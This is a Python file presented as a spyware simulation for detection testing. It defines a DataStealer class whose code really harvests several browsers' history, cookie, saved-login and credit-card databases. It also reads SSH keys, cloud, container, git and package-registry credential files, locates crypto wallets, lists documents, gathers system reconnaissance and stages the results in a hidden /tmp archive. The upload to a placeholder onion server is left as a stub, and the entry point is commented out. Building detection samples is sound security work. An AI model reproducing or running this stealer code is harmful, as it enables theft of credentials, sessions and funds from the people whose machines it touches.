#!/usr/bin/env python3
"""
Spyware/Data Stealer Simulation - TEST ONLY
DO NOT EXECUTE - For security detection testing
"""

import os
import sys
import json
import sqlite3
import base64
import shutil
import zipfile
import tempfile
from pathlib import Path
from datetime import datetime

# Exfiltration configuration
EXFIL_SERVER = "https://evil-collector.onion/upload"
STAGING_DIR = "/tmp/.cache_data"

class DataStealer:
    def __init__(self):
        self.collected_data = {
            "browser_data": [],
            "credentials": [],
            "documents": [],
            "crypto_wallets": [],
            "system_info": {}
        }
        
    def _collect_browser_data(self):
        """Steal browser history, cookies, passwords"""
        browsers = {
            "chrome": Path.home() / ".config/google-chrome/Default",
            "firefox": Path.home() / ".mozilla/firefox",
            "chromium": Path.home() / ".config/chromium/Default",
            "brave": Path.home() / ".config/BraveSoftware/Brave-Browser/Default",
        }
        
        for browser, path in browsers.items():
            if not path.exists():
                continue
                
            # History
            history_db = path / "History"
            if history_db.exists():
                self._steal_sqlite(history_db, "urls", browser)
            
            # Cookies
            cookies_db = path / "Cookies"
            if cookies_db.exists():
                self._steal_sqlite(cookies_db, "cookies", browser)
            
            # Login Data (encrypted passwords)
            login_db = path / "Login Data"
            if login_db.exists():
                self._steal_sqlite(login_db, "logins", browser)
            
            # Credit cards
            webdata_db = path / "Web Data"
            if webdata_db.exists():
                self._steal_sqlite(webdata_db, "credit_cards", browser)
    
    def _steal_sqlite(self, db_path, table, source):
        """Extract data from SQLite database"""
        try:
            # Copy to temp to avoid locks
            temp_db = tempfile.mktemp(suffix='.db')
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get table data
            cursor.execute(f"SELECT * FROM {table} LIMIT 1000")
            rows = cursor.fetchall()
            
            self.collected_data["browser_data"].append({
                "source": source,
                "table": table,
                "count": len(rows),
                "data": str(rows)[:5000]  # Truncate for simulation
            })
            
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            pass
    
    def _collect_credentials(self):
        """Steal stored credentials"""
        cred_locations = [
            # SSH keys
            (Path.home() / ".ssh", "ssh_keys"),
            # AWS credentials
            (Path.home() / ".aws/credentials", "aws"),
            # GCP credentials
            (Path.home() / ".config/gcloud", "gcp"),
            # Azure credentials
            (Path.home() / ".azure", "azure"),
            # Kubernetes config
            (Path.home() / ".kube/config", "kubernetes"),
            # Docker config
            (Path.home() / ".docker/config.json", "docker"),
            # Git credentials
            (Path.home() / ".git-credentials", "git"),
            # NPM token
            (Path.home() / ".npmrc", "npm"),
            # PyPI token
            (Path.home() / ".pypirc", "pypi"),
        ]
        
        for path, cred_type in cred_locations:
            if path.exists():
                if path.is_file():
                    try:
                        content = path.read_text()[:2000]
                        self.collected_data["credentials"].append({
                            "type": cred_type,
                            "path": str(path),
                            "content": content
                        })
                    except:
                        pass
                elif path.is_dir():
                    for f in path.rglob("*"):
                        if f.is_file():
                            try:
                                content = f.read_text()[:1000]
                                self.collected_data["credentials"].append({
                                    "type": cred_type,
                                    "path": str(f),
                                    "content": content
                                })
                            except:
                                pass
    
    def _collect_crypto_wallets(self):
        """Steal cryptocurrency wallet data"""
        wallet_locations = [
            # Bitcoin
            (Path.home() / ".bitcoin/wallet.dat", "bitcoin"),
            # Ethereum
            (Path.home() / ".ethereum/keystore", "ethereum"),
            # Monero
            (Path.home() / ".bitmonero", "monero"),
            # Electrum
            (Path.home() / ".electrum/wallets", "electrum"),
            # Exodus
            (Path.home() / ".config/Exodus", "exodus"),
            # Atomic Wallet
            (Path.home() / ".atomicwallet", "atomic"),
        ]
        
        for path, wallet_type in wallet_locations:
            if path.exists():
                self.collected_data["crypto_wallets"].append({
                    "type": wallet_type,
                    "path": str(path),
                    "exists": True
                })
    
    def _collect_documents(self):
        """Find and steal sensitive documents"""
        sensitive_patterns = [
            "*.pdf", "*.doc", "*.docx", "*.xls", "*.xlsx",
            "*.txt", "*.csv", "*.json", "*.xml",
            "*password*", "*credential*", "*secret*", "*private*",
            "*bank*", "*tax*", "*invoice*", "*contract*"
        ]
        
        search_dirs = [
            Path.home() / "Documents",
            Path.home() / "Downloads",
            Path.home() / "Desktop",
        ]
        
        for search_dir in search_dirs:
            if not search_dir.exists():
                continue
                
            for pattern in sensitive_patterns[:5]:  # Limit for simulation
                for f in search_dir.rglob(pattern):
                    if f.is_file() and f.stat().st_size < 10_000_000:  # <10MB
                        self.collected_data["documents"].append({
                            "path": str(f),
                            "size": f.stat().st_size,
                            "modified": datetime.fromtimestamp(f.stat().st_mtime).isoformat()
                        })
    
    def _collect_system_info(self):
        """Gather system reconnaissance"""
        import subprocess
        
        self.collected_data["system_info"] = {
            "hostname": os.uname().nodename,
            "user": os.getenv("USER"),
            "home": str(Path.home()),
            "platform": sys.platform,
        }
        
        # Network info
        try:
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
            self.collected_data["system_info"]["network"] = result.stdout[:2000]
        except:
            pass
        
        # Running processes
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            self.collected_data["system_info"]["processes"] = result.stdout[:3000]
        except:
            pass
    
    def _package_data(self):
        """Package stolen data for exfiltration"""
        os.makedirs(STAGING_DIR, exist_ok=True)
        
        # Save as JSON
        data_file = os.path.join(STAGING_DIR, "stolen_data.json")
        with open(data_file, 'w') as f:
            json.dump(self.collected_data, f, indent=2)
        
        # Create encrypted archive
        archive_path = os.path.join(STAGING_DIR, "data.zip")
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(data_file, "data.json")
        
        return archive_path
    
    def _exfiltrate(self, archive_path):
        """Send data to C2 server"""
        # Would use requests/urllib to POST data
        # with base64 encoding and encryption
        pass
    
    def run(self):
        """Execute data collection"""
        print("[*] Collecting browser data...")
        self._collect_browser_data()
        
        print("[*] Collecting credentials...")
        self._collect_credentials()
        
        print("[*] Searching for crypto wallets...")
        self._collect_crypto_wallets()
        
        print("[*] Finding sensitive documents...")
        self._collect_documents()
        
        print("[*] Gathering system info...")
        self._collect_system_info()
        
        print("[*] Packaging data...")
        archive = self._package_data()
        
        print("[*] Exfiltrating...")
        self._exfiltrate(archive)
        
        print("[+] Complete!")

if __name__ == "__main__":
    print("[!] SPYWARE SIMULATION - TEST FILE ONLY")
    print("[!] This file is for security testing purposes")
    # stealer = DataStealer()
    # stealer.run()
